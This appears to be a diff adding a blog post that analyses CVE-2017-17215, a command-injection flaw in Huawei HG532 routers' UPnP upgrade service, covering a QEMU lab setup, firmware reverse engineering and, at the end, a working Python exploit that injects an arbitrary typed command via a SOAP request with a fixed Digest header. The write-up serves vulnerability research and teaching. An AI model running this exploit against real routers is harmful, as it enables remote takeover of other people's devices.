@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/enblog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/enblog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/enblog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/enblog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/enblog/css/main.css">
+
+
+<link rel="stylesheet" href="/enblog/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zer0ptr.github.io","root":"/enblog/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Description This remote command execution vulnerability exists in HUAWEI HG532 routers, as disclosed by Check Point security researchers. The TR-064 implementation in Huawei devices is exposed to the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Huawei HG532 RCE Vulnerability Analysis">
+<meta property="og:url" content="https://zer0ptr.github.io/enblog/2026/06/07/iot-huawei-hg532-rce/index.html">
+<meta property="og:site_name" content="Zer0ptr&#39;s Blog">
+<meta property="og:description" content="Description This remote command execution vulnerability exists in HUAWEI HG532 routers, as disclosed by Check Point security researchers. The TR-064 implementation in Huawei devices is exposed to the">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/2.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/3.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/7.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/8.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/9.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/10.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/11.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/12.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/13.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/14.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/15.png">
+<meta property="og:image" content="https://blog.zer0ptr.icu/images/iot-hg532/6.png">
+<meta property="article:published_time" content="2026-06-07T12:55:27.000Z">
+<meta property="article:modified_time" content="2026-06-07T13:47:39.291Z">
+<meta property="article:author" content="Hailin Zheng">
+<meta property="article:tag" content="IOT">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zer0ptr.icu/images/iot-hg532/2.png">
+
+<link rel="canonical" href="https://zer0ptr.github.io/enblog/2026/06/07/iot-huawei-hg532-rce/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Huawei HG532 RCE Vulnerability Analysis | Zer0ptr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/enblog/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Zer0ptr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/enblog/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/enblog/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/enblog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/enblog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://zer0ptr.github.io/enblog/2026/06/07/iot-huawei-hg532-rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/enblog/images/hailin.jpg">
+      <meta itemprop="name" content="Hailin Zheng">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zer0ptr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Huawei HG532 RCE Vulnerability Analysis
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2026-06-07 20:55:27 / Modified: 21:47:39" itemprop="dateCreated datePublished" datetime="2026-06-07T20:55:27+08:00">2026-06-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ul>
+<li>This remote command execution vulnerability exists in HUAWEI HG532 routers, as disclosed by Check Point security researchers.</li>
+<li>The TR-064 implementation in Huawei devices is exposed to the WAN through port 37215 (UPnP). Within the device’s UPnP description, there is a service called <code>DeviceUpgrade</code>, which performs firmware upgrades by sending requests to <code>/ctrlt/DeviceUpgrade_1</code> (referred to as the <code>controlURL</code>).</li>
+<li>This is executed through two elements: <code>NewStatusURL</code> and <code>NewDownloadURL</code>.</li>
+<li>The vulnerability allows remote attackers to execute arbitrary commands by injecting shell metacharacters <code>&quot;$()&quot;</code> into NewStatusURL and NewDownloadURL.</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><h3 id="Why-can-not-QEMU-communicate-with-the-host-machine"><a href="#Why-can-not-QEMU-communicate-with-the-host-machine" class="headerlink" title="Why can not QEMU communicate with the host machine?"></a>Why can not QEMU communicate with the host machine?</h3><p>The <code>tap0</code> interface is missing under bridge <code>br0</code>. Running <code>sudo brctl show br0</code> only displays:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bridge name    bridge <span class="built_in">id</span>        STP enabled    interfaces</span><br><span class="line">br0            8000.9a6776f76b27    no         ens33</span><br></pre></td></tr></table></figure>
+
+<p>The absence of <code>tap0</code> prevents the QEMU virtual network interface from connecting to the bridge, breaking communication between the host and QEMU.</p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="Step-1-Create-and-Configure-tap0"><a href="#Step-1-Create-and-Configure-tap0" class="headerlink" title="Step 1: Create and Configure tap0"></a>Step 1: Create and Configure <code>tap0</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tunctl -t tap0 -u pwn        <span class="comment"># Create tap0 device</span></span><br><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> tap0 up          <span class="comment"># Bring up tap0</span></span><br><span class="line"><span class="built_in">sudo</span> brctl addif br0 tap0         <span class="comment"># Add tap0 to the bridge</span></span><br><span class="line"><span class="built_in">sudo</span> brctl show br0               <span class="comment"># Verify (tap0 should now be visible)</span></span><br></pre></td></tr></table></figure>
+
+<p>And we should define it in our QEMU launch script as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+
+<p><strong>Key point</strong>: <code>-net tap,ifname=tap0,script=no,downscript=no</code> explicitly specifies the use of the pre-created <code>tap0</code>.</p>
+<p>Then configure the IP Address Inside QEMU:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth1 192.168.138.131 netmask 255.255.255.0 up</span><br><span class="line">route add default gw 192.168.138.1</span><br><span class="line">ping 192.168.138.130   <span class="comment"># To verify whether communication is successful or not.</span></span><br><span class="line">————————————————————————————————————————————————————————————————————————————————</span><br><span class="line">64 bytes from 192.168.138.130: icmp_req=1 ttl=64 <span class="keyword">time</span>=5.06 ms</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss</span><br></pre></td></tr></table></figure>
+
+<p>Download Files Required by QEMU:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Desktop/HUAWEI-HG532/</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br></pre></td></tr></table></figure>
+
+<p>Now launching QEMU:<br><img src="https://blog.zer0ptr.icu/images/iot-hg532/2.png"></p>
+<p>We attempted to extract the firmware using unsquashfs, but found that the extracted directory was empty. This is likely because Huawei modified the SquashFS format. We then used Firmware Mod Kit to perform the extraction.</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/3.png"></p>
+<h2 id="Analysis-the-Vulnerability"><a href="#Analysis-the-Vulnerability" class="headerlink" title="Analysis the Vulnerability"></a>Analysis the Vulnerability</h2><p>We can locate the vulnerable <code>upnp</code> binary in the <code>/firmware-mod-kit/fmk/rootfs/bin</code> directory and inspect its properties using <code>checksec upnp</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn:~/Desktop/firmware-mod-kit/fmk/rootfs/bin$ checksec ./upnp</span><br><span class="line">[*] Checking <span class="keyword">for</span> new versions of pwntools</span><br><span class="line">    To <span class="built_in">disable</span> this functionality, <span class="built_in">set</span> the contents of /home/pwn/.cache/.pwntools-cache-3.10/update to <span class="string">&#x27;never&#x27;</span> (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] You have the latest version of Pwntools (4.15.0)</span><br><span class="line">[!] Could not populate MIPS GOT: seek out of range</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/firmware-mod-kit/fmk/rootfs/bin/upnp&#x27;</span></span><br><span class="line">    Arch:       mips-32-big</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>As we can see, this is a 32-bit big-endian MIPS binary with no protections enabled.</p>
+<p>According to the official vulnerability report, the vulnerability exists in both the <code>/bin/upnp</code> and <code>/bin/mic </code>binaries. Let’s load them into IDA for reverse engineering analysis.</p>
+<p>In the main function, there is a core call that initializes the network service. Following into the <code>init</code> function, we find a loop that iterates 5 times (the second argument), performing operations on each entry in the <code>m_astInetdApps</code> array. Let’s examine the array.</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/7.png"></p>
+<p>We examine this function and see that it starts a socket server. Based on the socket parameter definitions, we hypothesize that <code>v16</code> is the IP address. Let’s trace how <code>v16</code> is defined:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/8.png"></p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/9.png"></p>
+<p>Let us explain this:</p>
+<ul>
+<li><code>v16 = v31;</code>: <code>v31</code> is the parsed IP address string</li>
+<li><code>if ( !v28 ) v16 = 0;</code>: <code>0</code> &#x3D; <code>NULL</code> &#x3D; <code>INADDR_ANY</code></li>
+</ul>
+<p>This corresponds to the following:</p>
+<ul>
+<li>The configuration string format is service_name|IP|port|command. </li>
+<li>v16 is assigned from the parsed IP field. 0 in socket programming represents INADDR_ANY (bind to all interfaces).</li>
+<li>From this we can conclude: the firmware does not restrict this service to binding only on the internal network interface (LAN port), causing it to bind to 0.0.0.0 (all interfaces) and become exposed to the wide area network (WAN) side. Attackers on the internet can directly send crafted SOAP packets to this port, triggering the command injection vulnerability and achieving remote code execution.</li>
+</ul>
+<p>Next is the analysis specific file containing the vulnerability:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/10.png"></p>
+<p>We can see in the <code>main</code> function that server1 listens on port <code>37215</code>. Let’s now examine the <code>ATP_UPNP_Init </code>function, which initializes the UPnP framework:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/11.png"></p>
+<p>We can see the functions that register UPnP devices and services. Continuing to follow the code, we then see the service registration and function registration functions for the entire TR-064 service. Let’s follow the function registration:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/12.png"></p>
+<p>From the official vulnerability report, we know that the action with ID 21 corresponds to Upgrade. The handle for registering this action is returned from <code>v9 = ATP_UPnP_RegService(v33, &quot;WANPPPConnection:1&quot;, &quot;WanPppConn.xml&quot;, 3, 1, 0, &amp;v34);</code> </p>
+<p>Following the same approach, let’s trace into the function at <code>v66</code>:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/13.png"></p>
+<p>passing through some defined conditions, we arrive at <code>g_astActionArray</code>:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/14.png"></p>
+<p>Following to the address of this function:</p>
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/15.png"></p>
+<p>This is the action function for the <code>DeviceUpgrade</code> service. It extracts the <code>NewDownloadURL</code> and <code>NewStatusURL</code> parameters from the SOAP request, performs no filtering whatsoever, directly concatenates them (since <code>;</code> connects two independent statements), and executes them via system(), resulting in remote code execution.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;command &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;;mkdir lontan0;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;<span class="subst">&#123;cmd&#125;</span>;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.138.131:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.zer0ptr.icu/images/iot-hg532/6.png" alt="Exploit successfully!"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/enblog/tags/IOT/" rel="tag"># IOT</a>
+              <a href="/enblog/tags/RCE/" rel="tag"># RCE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/enblog/2026/06/07/hello-world/" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Description"><span class="nav-number">1.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Environment-Setup"><span class="nav-number">2.</span> <span class="nav-text">Environment Setup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Why-can-not-QEMU-communicate-with-the-host-machine"><span class="nav-number">2.1.</span> <span class="nav-text">Why can not QEMU communicate with the host machine?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution"><span class="nav-number">2.2.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-1-Create-and-Configure-tap0"><span class="nav-number">2.2.1.</span> <span class="nav-text">Step 1: Create and Configure tap0</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-the-Vulnerability"><span class="nav-number">3.</span> <span class="nav-text">Analysis the Vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Hailin Zheng"
+      src="/enblog/images/hailin.jpg">
+  <p class="site-author-name" itemprop="name">Hailin Zheng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/enblog/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zer0ptr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zer0ptr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:iszhenghailin@gmail.com" title="E-Mail → mailto:iszhenghailin@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hailin Zheng</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/enblog/lib/anime.min.js"></script>
+  <script src="/enblog/lib/velocity/velocity.min.js"></script>
+  <script src="/enblog/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/enblog/js/utils.js"></script>
+
+<script src="/enblog/js/motion.js"></script>
+
+
+<script src="/enblog/js/schemes/muse.js"></script>
+
+
+<script src="/enblog/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
